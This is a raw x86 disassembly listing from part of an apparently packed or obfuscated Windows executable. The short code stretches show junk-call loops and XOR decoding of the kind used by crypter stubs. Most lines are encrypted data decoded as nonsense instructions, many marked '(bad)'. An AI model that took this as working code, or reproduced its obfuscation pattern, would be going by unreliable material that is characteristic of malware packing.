  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b42
  403acb:	aas    
  403acc:	std    
  403acd:	shl    DWORD PTR [eax],0x10
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b1d
  403ad7:	dec    ecx
  403ad8:	xchg   esp,edx
  403ada:	cmp    al,0x7f
  403adc:	inc    esp
  403add:	xchg   ebx,eax
  403ade:	rcl    DWORD PTR [ebp-0x78],cl
  403ae1:	hlt    
  403ae2:	jle    0x403b49
  403ae4:	pusha  
  403ae5:	sbb    DWORD PTR [ebx],edx
  403ae7:	test   al,0xa0
  403ae9:	fadd   st(7),st
  403aeb:	mov    ds:0x2efe45db,al
  403af0:	in     eax,0x3f
  403af2:	cmp    cl,BYTE PTR ss:[ebp+0x2e93b188]
  403af9:	fnstcw WORD PTR [edx]
  403afb:	fcom   QWORD PTR [edx]
  403afd:	(bad)  
  403afe:	das    
  403aff:	xchg   DWORD PTR [ebx-0x595c8449],ebx
  403b05:	or     al,0x25
  403b07:	sbb    BYTE PTR [eax+0x34],0x35
  403b0b:	je     0x403abb
  403b0d:	inc    edi
  403b0e:	jno    0x403aa5
  403b10:	sub    al,0x56
  403b12:	xchg   BYTE PTR [esi],bl
  403b14:	loop   0x403b94
  403b16:	in     al,dx
  403b17:	mov    dl,0xb7
  403b19:	dec    eax
  403b1a:	stc    
  403b1b:	pop    edi
  403b1c:	add    BYTE PTR [ecx+0x6ffd0ce],cl
  403b22:	xor    al,0x45
  403b24:	adc    BYTE PTR [edx-0x74],cl
  403b27:	into   
  403b28:	outs   dx,DWORD PTR ds:[esi]
  403b29:	mov    ah,0xd2
  403b2b:	lods   al,BYTE PTR ds:[esi]
  403b2c:	fwait
  403b2d:	xchg   edx,eax
  403b2e:	fiadd  WORD PTR [esp+eax*2+0x63]
  403b32:	mov    al,0x9b
  403b34:	arpl   WORD PTR [edx+edi*2-0x132ed2a2],di
  403b3b:	sub    eax,0x74292421
  403b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b41:	pop    edx
  403b42:	lock add eax,0x34d0dd2c
  403b48:	sub    eax,0x54591e1f
  403b4d:	daa    
  403b4e:	push   edi
  403b4f:	arpl   WORD PTR [ebp-0x2],sp
  403b52:	aam    0x89
  403b54:	(bad)  
  403b55:	adc    DWORD PTR [ebx-0x6f9a39c7],esi
  403b5b:	leave  
  403b5c:	lahf   
  403b5d:	popa   
  403b5e:	xor    eax,0x5f11ecb2
  403b63:	adc    ebx,DWORD PTR [edi]
  403b65:	fld    DWORD PTR [eax+0x4e656360]
  403b6b:	enter  0x92af,0x21
  403b6f:	cmp    eax,0x6178c26a
  403b74:	or     al,0x53
  403b76:	xchg   esp,eax
  403b77:	jp     0x403be0
  403b79:	sbb    esp,0xb8ebabe3
  403b7f:	jg     0x403b4c
  403b81:	inc    edx
  403b82:	inc    eax
  403b83:	ficom  DWORD PTR [esi+0x7a7d7063]
  403b89:	lea    edi,[ebp-0xa42a1c3]
  403b8f:	adc    dl,BYTE PTR [edi+0x1a]
  403b92:	retf   
  403b93:	mov    al,0xd4
  403b95:	idiv   DWORD PTR [edi]
  403b97:	stos   BYTE PTR es:[edi],al
  403b98:	jae    0x403b39
  403b9a:	imul   edx,edi,0x71
  403b9d:	push   edi
  403b9e:	mov    dl,0x68
  403ba0:	xor    ecx,edx
  403ba2:	xor    al,0xdf
  403ba4:	inc    ecx
  403ba5:	or     eax,0x1af5847
  403baa:	and    esi,DWORD PTR [ebx+0x73]
  403bad:	inc    esi
  403bae:	pop    ebx
  403baf:	dec    edx
  403bb0:	retf   
  403bb1:	xchg   ebp,eax
  403bb2:	push   0xffffffa6
  403bb4:	jecxz  0x403bd1
  403bb6:	dec    edi
  403bb7:	mov    dl,0x3d
  403bb9:	or     al,0x57
  403bbb:	cmp    DWORD PTR [edx],edx
  403bbd:	xchg   ebp,eax
  403bbe:	push   ds
  403bbf:	mov    esp,0x4fc44bcf
  403bc4:	ja     0x403b96
  403bc6:	mov    BYTE PTR ss:[eax-0x5c],cl
  403bca:	outs   dx,BYTE PTR ds:[esi]
  403bcb:	push   edi
  403bcc:	sbb    BYTE PTR [edi],bh
  403bce:	cli    
  403bcf:	out    0x82,al
  403bd1:	retf   0x603e
  403bd4:	sbb    eax,0x8eabe87c
  403bd9:	cmp    dh,BYTE PTR [edi-0x47]
  403bdc:	ins    BYTE PTR es:[edi],dx
  403bdd:	lahf   
  403bde:	js     0x403c58
  403be0:	inc    ebp
  403be1:	push   ecx
  403be2:	xchg   esp,eax
  403be3:	or     eax,0xadb57085
  403be8:	jp     0x403c1d
  403bea:	scas   al,BYTE PTR es:[edi]
  403beb:	push   edx
  403bec:	pop    ebp
  403bed:	xchg   ecx,eax
  403bee:	push   0xffffffa0
  403bf0:	fs adc dl,ah
  403bf3:	inc    ebx
  403bf4:	into   
  403bf5:	lods   al,BYTE PTR ds:[esi]
  403bf6:	arpl   WORD PTR [esi],sp
  403bf8:	mov    edx,ecx
  403bfa:	jle    0x403bad
  403bfc:	adc    eax,0x82c3340
  403c01:	add    dh,BYTE PTR [eax-0x3ae5fd37]
  403c07:	outs   dx,DWORD PTR ds:[esi]
  403c08:	push   esp
  403c09:	sbb    ch,BYTE PTR [esi+0xe]
  403c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c0d:	out    dx,al
  403c0e:	push   esi
  403c0f:	jg     0x403b98
  403c11:	dec    esp
  403c12:	xchg   DWORD PTR [edi+0x5d],ebp
  403c15:	fwait
  403c16:	dec    edi
  403c17:	sbb    ah,BYTE PTR [esi-0x47]
  403c1a:	xchg   esp,eax
  403c1b:	arpl   WORD PTR [edi],di
  403c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c1e:	cmp    ebp,DWORD PTR [ebp+0x6f]
  403c21:	inc    edi
  403c22:	in     al,dx
  403c23:	dec    ecx
  403c24:	xor    esp,DWORD PTR [eax*8+0x200d8bc]
  403c2b:	stc    
  403c2c:	cdq    
  403c2d:	jge    0x403bed
  403c2f:	pop    es
  403c30:	ds mov bl,0x64
  403c33:	dec    esp
  403c34:	nop
  403c35:	or     BYTE PTR [ecx],al
  403c37:	(bad)  
  403c38:	rcr    edi,0x75
  403c3b:	pop    edx
  403c3c:	ficomp DWORD PTR [ecx+0x7cff90f9]
  403c42:	inc    ebp
  403c43:	mov    esi,0xe20deddf
  403c48:	adc    al,0xcb
  403c4a:	xor    edi,DWORD PTR [eax-0x7ecec647]
  403c50:	test   eax,0x6d83cb6e
  403c55:	bound  eax,QWORD PTR [eax]
  403c57:	ret    
  403c58:	push   ebp
  403c59:	and    al,0x2d
  403c5b:	and    BYTE PTR [ebp-0x6123558b],bh
  403c61:	inc    eax
  403c62:	cmp    BYTE PTR [esi-0x28],cl
  403c65:	or     BYTE PTR [esi+edx*8],al
  403c68:	popa   
  403c69:	test   DWORD PTR [ecx-0x4001a04a],esp
  403c6f:	adc    cl,BYTE PTR [esi]
  403c71:	test   BYTE PTR [esi+0xa57ca85],al
  403c77:	in     eax,dx
  403c78:	gs arpl cx,bx
  403c7b:	pop    ds
  403c7c:	or     eax,ebx
  403c7e:	div    BYTE PTR [edi-0x5a]
  403c81:	sbb    BYTE PTR [edx+0x30],bh
  403c84:	into   
  403c85:	and    ecx,ebx
  403c87:	(bad)  
  403c88:	mov    ch,0xab
  403c8a:	cmp    eax,0x9f96f48b
  403c8f:	popa   
  403c90:	mov    ebp,ecx
  403c92:	popa   
  403c93:	js     0x403caf
  403c95:	pop    esp
  403c96:	in     al,dx
  403c97:	cmp    edi,eax
  403c99:	mov    dh,0xb8
  403c9b:	popa   
  403c9c:	jbe    0x403cca
  403c9e:	add    BYTE PTR [esi+edi*8+0xe],ah
  403ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ca3:	push   ecx
  403ca4:	fyl2x  
  403ca6:	mov    eax,ds:0x31c759ae
  403cab:	jnp    0x403c78
  403cad:	(bad)  
  403cae:	pop    ss
  403caf:	xchg   ebx,eax
  403cb0:	cs pusha 
  403cb2:	cmp    al,0x43
  403cb4:	dec    ebp
  403cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb6:	sub    BYTE PTR [ebp+0x6be7985b],dl
  403cbc:	popf   
  403cbd:	repnz arpl WORD PTR [edx-0xb5d5936],dx
  403cc4:	jmp    0x403d28
  403cc6:	sub    BYTE PTR [eax-0x38b131f9],ch
  403ccc:	push   es
  403ccd:	and    ebx,edi
  403ccf:	in     eax,dx
  403cd0:	repz push ss
  403cd2:	retf   0x8a81
  403cd5:	push   esi
  403cd6:	cmp    bh,cl
  403cd8:	sbb    al,0xdc
  403cda:	(bad)  
  403cdb:	dec    esi
  403cdc:	sbb    DWORD PTR [esi-0x35],0x7295036e
  403ce3:	push   ebp
  403ce4:	stos   DWORD PTR es:[edi],eax
  403ce5:	pop    edx
  403ce6:	mov    edi,0xa1c17ce3
  403ceb:	mov    WORD PTR [ecx],?
  403ced:	out    0x3,al
  403cef:	ror    ebx,1
  403cf1:	hlt    
  403cf2:	mov    edi,0x7bf8f485
  403cf7:	mov    DWORD PTR [edx+0xc],edx
  403cfa:	iret   
  403cfb:	xchg   edx,eax
  403cfc:	repz xchg ebx,eax
  403cfe:	mov    DWORD PTR [ebx+0x0],eax
  403d01:	or     eax,0xe9586ad2
  403d06:	or     ebx,DWORD PTR [eax]
  403d08:	push   es
  403d09:	and    BYTE PTR [edx],ah
  403d0b:	adc    ebp,DWORD PTR [ebp+0xa]
  403d0e:	inc    esp
  403d0f:	mov    al,ds:0xf3661467
  403d14:	jns    0x403c97
  403d16:	lods   al,BYTE PTR ds:[esi]
  403d17:	call   0x444e:0x65e7f5cf
  403d1e:	dec    ebx
  403d1f:	xor    edx,eax
  403d21:	jae    0x403caf
  403d23:	pop    ebp
  403d24:	or     BYTE PTR [eax+0x371c100c],bh
  403d2a:	psubsw mm6,QWORD PTR [edi+ebp*4-0x7d]
  403d2f:	xchg   DWORD PTR [eax],ecx
  403d31:	fcom   QWORD PTR [edx+0x14b80f77]
  403d37:	jo     0x403d4b
  403d39:	sar    DWORD PTR [edx+0x10],1
  403d3c:	icebp  
  403d3d:	ret    0x8206
  403d40:	pop    ds
  403d41:	cmp    ch,BYTE PTR [edx+0x3ab8e239]
  403d47:	push   ds
  403d48:	ja     0x403d45
  403d4a:	pop    ecx
  403d4b:	xchg   edi,eax
  403d4c:	xchg   esi,eax
  403d4d:	push   ebp
  403d4e:	ja     0x403d29
  403d50:	sub    DWORD PTR [ebp+0x33],esp
  403d53:	push   edi
  403d54:	mov    bh,0x40
  403d56:	xchg   ecx,eax
  403d57:	mov    ds,ebp
  403d59:	sbb    bh,BYTE PTR [esi]
  403d5b:	push   edx
  403d5c:	push   ecx
  403d5d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  403d5f:	jl     0x403dab
  403d61:	test   esp,edx
  403d63:	adc    BYTE PTR ds:0x993cf78f,0xdc
  403d6a:	adc    ch,BYTE PTR [ecx-0xaa16e20]
  403d70:	add    esp,esp
  403d72:	or     esp,DWORD PTR [ecx-0x21]
  403d75:	gs xor ebp,0xffffffa8
  403d79:	inc    edx
  403d7a:	xchg   edx,eax
  403d7b:	test   al,0x5e
  403d7d:	test   DWORD PTR [edx-0x1c],ecx
  403d80:	pushf  
  403d81:	dec    ebp
  403d82:	(bad)  
  403d83:	mov    al,ds:0x6630d6d9
  403d88:	or     al,0x7e
  403d8a:	cmp    bh,BYTE PTR [ebx]
  403d8c:	out    dx,eax
  403d8d:	inc    ebx
  403d8e:	jb     0x403df7
  403d90:	out    dx,al
  403d91:	add    al,0xae
  403d93:	push   es
  403d94:	in     al,0x43
  403d96:	iret   
  403d97:	inc    eax
  403d98:	cmp    bl,bh
  403d9a:	xchg   esp,eax
  403d9b:	pop    ecx
  403d9c:	call   0xd456:0xb96d3038
  403da3:	inc    ecx
  403da4:	fild   QWORD PTR [edx+0x64]
  403da7:	out    dx,eax
  403da8:	inc    DWORD PTR [ebx+0x11]
  403dab:	rcl    DWORD PTR [esi+0x5a483f8e],0x36
  403db2:	popf   
  403db3:	jmp    0x93083a79
  403db8:	ret    0xf4c4
  403dbb:	or     eax,0x2bf05d8b
  403dc0:	fistp  QWORD PTR [ebx]
  403dc2:	fimul  DWORD PTR [edi]
  403dc4:	xchg   DWORD PTR [eax],ecx
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	add    BYTE PTR [ebx-0x5a1627ab],cl
  403dce:	add    eax,DWORD PTR [eax]
  403dd0:	add    BYTE PTR [ebx+0x7d8bd055],cl
  403dd6:	cld    
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x73
  403e75:	pushf  
  403e76:	inc    edi
  403e77:	in     al,dx
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403efc
  403e81:	and    eax,0xd1807c37
  403e86:	pop    edx
  403e87:	stos   DWORD PTR es:[edi],eax
  403e88:	ret    0x102b
  403e8b:	loope  0x403eae
  403e8d:	stos   BYTE PTR es:[edi],al
  403e8e:	add    eax,0x6e85018e
  403e93:	push   ecx
  403e94:	mov    ecx,0x5737494c
  403e99:	inc    ebp
  403e9a:	xchg   DWORD PTR [esi+0x544eef6a],eax
  403ea0:	dec    edx
  403ea1:	mov    cl,0x80
  403ea3:	sti    
  403ea4:	push   esp
  403ea5:	je     0x403e31
  403ea7:	and    eax,0x10862988
  403eac:	inc    edi
  403ead:	jns    0x403ea0
  403eaf:	or     DWORD PTR [edi],edx
  403eb1:	cs in  eax,dx
  403eb3:	mov    WORD PTR [esp],?
  403eb6:	cdq    
  403eb7:	rcl    DWORD PTR [eax-0xc],1
  403eba:	jae    0x403e73
  403ebc:	pop    ebx
  403ebd:	(bad)  
  403ebe:	mov    ebp,0x50628950
  403ec3:	jae    0x403eb1
  403ec5:	cmp    ebx,ecx
  403ec7:	ja     0x403e86
  403ec9:	loope  0x403f16
  403ecb:	js     0x403f06
  403ecd:	sbb    bl,BYTE PTR [ebp+eiz*4-0x7e36f29b]
  403ed4:	cmp    eax,0x4e68b46e
  403ed9:	lahf   
  403eda:	xor    eax,0xcedfc1f7
  403edf:	std    
  403ee0:	test   BYTE PTR [edx+0x76],ch
  403ee3:	xchg   esi,eax
  403ee4:	loope  0x403ebd
  403ee6:	cmp    DWORD PTR [eax+0x3d8a0938],esp
  403eec:	(bad)  
  403eed:	ja     0x403f3e
  403eef:	mov    ecx,0x178290b7
  403ef4:	fsubr  DWORD PTR [esi]
  403ef6:	shr    DWORD PTR [ebx],0x1b
  403ef9:	lods   eax,DWORD PTR ds:[esi]
  403efa:	cmp    eax,0x8aa929ba
  403eff:	pop    esp
  403f00:	push   ds
  403f01:	and    DWORD PTR [edi+0x1e03e6fc],esi
  403f07:	loope  0x403f5e
  403f09:	rol    BYTE PTR [ecx],cl
  403f0b:	jg     0x403ecb
  403f0d:	xor    BYTE PTR [esi],ah
  403f0f:	or     edi,DWORD PTR [edx+0x58f2848]
  403f15:	mov    bh,0xec
  403f17:	pop    ebx
  403f18:	enter  0x971d,0x8d
  403f1c:	pop    ebx
  403f1d:	push   0x5458795f
  403f22:	mov    ds:0x63af7ce8,al
  403f27:	push   ebx
  403f28:	pop    edi
  403f29:	jns    0x403f86
  403f2b:	cld    
  403f2c:	stos   DWORD PTR es:[edi],eax
  403f2d:	cld    
  403f2e:	push   es
  403f2f:	mov    ch,0xf7
  403f31:	mov    DWORD PTR [eax+0x112b489f],edi
  403f37:	mov    gs,ecx
  403f39:	adc    dh,ch
  403f3b:	xor    al,0xd0
  403f3d:	test   DWORD PTR [ebx+0x27],eax
  403f40:	ja     0x403efd
  403f42:	in     eax,0xab
  403f44:	cli    
  403f45:	mov    DWORD PTR [edi-0x58],esi
  403f48:	adc    eax,0x4306c5f0
  403f4d:	inc    ebx
  403f4e:	push   esi
  403f4f:	popa   
  403f50:	jbe    0x403f51
  403f52:	scas   eax,DWORD PTR es:[edi]
  403f53:	jne    0x403f1b
  403f55:	inc    edx
  403f56:	pop    edi
  403f57:	cs cmc 
  403f59:	test   al,0xf1
  403f5b:	inc    edi
  403f5c:	add    DWORD PTR [ebx-0x237834db],ebx
  403f62:	sub    dh,ah
  403f64:	mov    ebp,0xeaeaf77e
  403f69:	(bad)  
  403f6b:	inc    esp
  403f6c:	dec    eax
  403f6d:	imul   esi,DWORD PTR ds:0xaf5b2f60,0x30a6a708
  403f77:	imul   DWORD PTR [ebx-0x47]
  403f7a:	mov    ebp,gs
  403f7c:	aad    0x75
  403f7e:	mov    dl,0x8f
  403f80:	or     DWORD PTR [edx+edi*4-0x47],0x61
  403f85:	test   DWORD PTR [eax+0x451b2c17],eax
  403f8b:	mov    dh,0x85
  403f8d:	das    
  403f8e:	and    BYTE PTR [eax],dh
  403f90:	jo     0x403f83
  403f92:	jne    0x403f4f
  403f94:	outs   dx,BYTE PTR ds:[esi]
  403f95:	mov    eax,0xf74993e6
  403f9a:	inc    esi
  403f9b:	fadd   QWORD PTR [ecx+0x5d8d565e]
  403fa1:	or     eax,0x87c3e941
  403fa6:	imul   ecx,ebp,0xffffff9b
  403fa9:	push   eax
  403faa:	push   ecx
  403fab:	xor    dl,cl
  403fad:	lods   eax,DWORD PTR ds:[esi]
  403fae:	add    al,0x8a
  403fb0:	mov    cl,0x3c
  403fb2:	(bad)  
  403fb4:	es shld edi,ebp,0x36
  403fb9:	aam    0xf7
  403fbb:	push   esp
  403fbc:	inc    ecx
  403fbd:	loop   0x403f9b
  403fbf:	(bad)  [edi+0x24]
  403fc2:	into   
  403fc3:	cwde   
  403fc4:	push   es
  403fc5:	in     eax,dx
  403fc6:	pop    ds
  403fc7:	xor    eax,0xaa2cf8a4
  403fcd:	mov    ebp,0xa01bb32d
  403fd2:	or     DWORD PTR [ebx-0x68d01469],eax
  403fd8:	test   DWORD PTR [ecx+ebx*8-0x19],esp
  403fdc:	mov    edi,0x1812606e
  403fe1:	jb     0x403f72
  403fe3:	outs   dx,BYTE PTR ds:[esi]
  403fe4:	fld    TBYTE PTR [ebx-0x71]
  403fe7:	mov    ch,0x4d
  403fe9:	retf   
  403fea:	(bad)  
  403feb:	cdq    
  403fec:	fcomp  QWORD PTR [ebp+0x7cba0e3e]
  403ff2:	inc    esi
  403ff3:	lahf   
  403ff4:	jb     0x40402b
  403ff6:	js     0x403faa
  403ff8:	and    edx,eax
  403ffa:	add    eax,0xd71f842f
  403fff:	push   ebx
  404000:	pop    esp
  404001:	mov    eax,ds:0xd041ce6d
  404006:	and    dh,dh
  404008:	sub    BYTE PTR [eax+0xd612e8f],cl
  40400e:	scas   al,BYTE PTR es:[edi]
  40400f:	(bad)  
  404010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404011:	add    DWORD PTR [eax-0x35],edi
  404014:	xchg   ebx,eax
  404015:	call   DWORD PTR [edi]
  404017:	sahf   
  404018:	pop    ds
  404019:	adc    ebp,edx
  40401b:	rcr    BYTE PTR [eax+0xcfc4962],1
  404021:	mov    ch,0x6d
  404023:	xchg   DWORD PTR [edi+0x45621368],eax
  404029:	jne    0x404080
  40402b:	in     al,dx
  40402c:	data16 stos BYTE PTR es:[edi],al
  40402e:	(bad)  
  40402f:	in     eax,0x99
  404031:	or     al,0xce
  404033:	in     eax,0xc4
  404035:	mov    dl,BYTE PTR cs:[edx+0x54]
  404039:	retf   0x1e38
  40403c:	fnstenv [ebx-0x1bdc7646]
  404042:	push   edx
  404043:	jns    0x404011
  404045:	mov    ah,0xe6
  404047:	xor    al,0xe2
  404049:	cmp    BYTE PTR [eax],al
  40404b:	xchg   ebp,eax
  40404c:	pushf  
  40404d:	mov    esp,0x66468b87
  404052:	clc    
  404053:	jp     0x4040d4
  404055:	jge    0x403ffb
  404057:	jl     0x404090
  404059:	jae    0x40409b
  40405b:	jg     0x404057
  40405d:	pop    ebp
  40405e:	jno    0x4040d0
  404060:	xchg   DWORD PTR ds:0x171e9c62,edi
  404066:	or     esi,ebx
  404068:	div    ebp
  40406a:	idiv   DWORD PTR [ebx-0x257b23d1]
  404070:	test   eax,edi
  404072:	dec    edi
  404073:	in     al,0x10
  404075:	pop    edi
  404076:	data16 js 0x404029
  404079:	cmp    ecx,edi
  40407b:	xor    esi,DWORD PTR [bp+0x53]
  40407f:	mov    edi,fs
  404081:	(bad)  
  404082:	arpl   WORD PTR [ecx+0x6c7c90bf],si
  404088:	pop    edi
  404089:	push   ebp
  40408a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40408b:	sbb    DWORD PTR [edi+0x27],ecx
  40408e:	out    dx,eax
  40408f:	fs jns 0x404017
  404092:	sub    edi,esi
  404094:	ds sub al,0x6e
  404097:	jnp    0x404022
  404099:	push   0xf261fb10
  40409e:	dec    edx
  40409f:	pop    ebx
  4040a0:	pop    ds
  4040a1:	loope  0x404103
  4040a3:	dec    esp
  4040a4:	add    al,0x52
  4040a6:	(bad)  
  4040a7:	jmp    0x9b83035b
  4040ac:	aam    0xb3
  4040ae:	test   dh,bl
  4040b0:	pop    ss
  4040b1:	push   eax
  4040b2:	dec    eax
  4040b3:	sub    BYTE PTR [ebx-0x68e732cc],dh
  4040b9:	ds ret 0xa647
  4040bd:	(bad)  
  4040be:	aad    0x31
  4040c0:	test   eax,0x338d8364
  4040c5:	sar    BYTE PTR [eax+0x39],cl
  4040c8:	call   0xbec1:0xe9c286cc
  4040cf:	popa   
  4040d0:	sbb    DWORD PTR [esi-0x5f],0xffffffab
  4040d4:	pop    ebx
  4040d5:	xlat   BYTE PTR ds:[ebx]
  4040d6:	clc    
  4040d7:	stos   BYTE PTR es:[edi],al
  4040d8:	mov    al,0xd4
  4040da:	push   esp
  4040db:	aas    
  4040dc:	sbb    edi,DWORD PTR [esi-0x65]
  4040df:	cmp    DWORD PTR [ecx],edi
  4040e1:	pop    ebp
  4040e2:	shl    BYTE PTR [ebx],1
  4040e4:	mov    ebp,0x4f584340
  4040e9:	xor    bl,BYTE PTR [edx]
  4040eb:	mov    bh,0x1a
  4040ed:	pop    eax
  4040ee:	scas   eax,DWORD PTR es:[edi]
  4040ef:	(bad)  
  4040f0:	fbld   TBYTE PTR [ecx+0x61]
  4040f3:	mov    BYTE PTR [ebx+0xe],ch
  4040f6:	sbb    eax,0x55bbacc
  4040fb:	dec    ebp
  4040fc:	xchg   BYTE PTR gs:[eax-0x5b],ch
  404100:	xchg   ebp,eax
  404101:	cli    
  404102:	clc    
  404103:	mov    ecx,0x78455808
  404108:	xlat   BYTE PTR ds:[ebx]
  404109:	jecxz  0x404097
  40410b:	(bad)  
  40410c:	imul   DWORD PTR [eax+ebp*4+0x8786601]
  404113:	pushf  
  404114:	je     0x4040fc
  404116:	sbb    esi,DWORD PTR [esi+edi*4+0x22]
  40411a:	(bad)  
  40411c:	mov    cl,0x98
  40411e:	inc    esi
  40411f:	bound  ecx,QWORD PTR [edx+esi*4-0x25]
  404123:	jae    0x40416d
  404125:	sar    BYTE PTR [ecx+0x5b],1
  404128:	imul   eax,DWORD PTR [esi-0x60],0xfb7292d
  40412f:	dec    esp
  404130:	cmp    eax,0xe08ae3b0
  404135:	xchg   DWORD PTR [ebp+ebx*1-0x46],ecx
  404139:	inc    ebp
  40413a:	pop    ds
  40413b:	cli    
  40413c:	xchg   ebp,eax
  40413d:	mov    dh,0x91
  40413f:	push   es
  404140:	test   al,0x83
  404142:	or     al,0x8c
  404144:	and    al,0x2d
  404146:	push   eax
  404147:	pop    ds
  404148:	hlt    
  404149:	xchg   ebx,eax
